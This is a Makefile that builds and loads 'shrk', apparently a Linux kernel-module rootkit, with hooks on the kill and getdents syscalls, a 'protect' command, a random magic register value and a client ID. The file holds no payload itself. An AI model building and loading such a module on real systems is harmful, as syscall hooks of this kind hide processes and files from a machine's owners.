# used by the format script
SRCS := $(shell find . -type f -name '*.c' -not -name '*.mod.*')
SRCS += $(shell find . -type f -name '*.h')

# check if shuf exists
_FOUND_SHUF = $(shell command -v shuf 2> /dev/null)

# options
SHRK_DEBUG = 1
ifdef _FOUND_SHUF
  SHRK_MAGIC_R15 = $(shell shuf -i 100-100000 -n1)
else
  SHRK_MAGIC_R15 = $(shell head -n50 /dev/urandom | wc -c)
endif
SHRK_CLIENT_ID = DEBUGID0

# kernel config is shit for out of tree modules
EXTRA_CFLAGS += -DSHRK_DEBUG=$(SHRK_DEBUG)             \
                -DSHRK_MAGIC_R15=$(SHRK_MAGIC_R15)     \
                -DSHRK_CLIENT_ID=\"$(SHRK_CLIENT_ID)\"

# kernel vars cant define with patsubst for some fucking reason
obj-m := shrk.o 
shrk-objs := main.o           \
             util.o           \
             cmds.o           \
             hooks.o          \
             hooks/kill.o     \
             hooks/getdents.o \
             cmds/protect.o
#        hooks/newfstatat.o \
#        hooks/statx.o      \
#        hooks/chdir.o      \
#        hooks/write.o      \
#        hooks/read.o       \
#        hooks/open.o       \

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
	rm -f *.order *.symvers *.mod *.mod.c *.o

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

format:
	clang-format -i -style=file $(SRCS)

load:
	@dmesg -C
	@insmod shrk.ko
	@dmesg

unload:
	@dmesg -C
	@rmmod shrk.ko
	@dmesg

.PHONY: clean format load unload
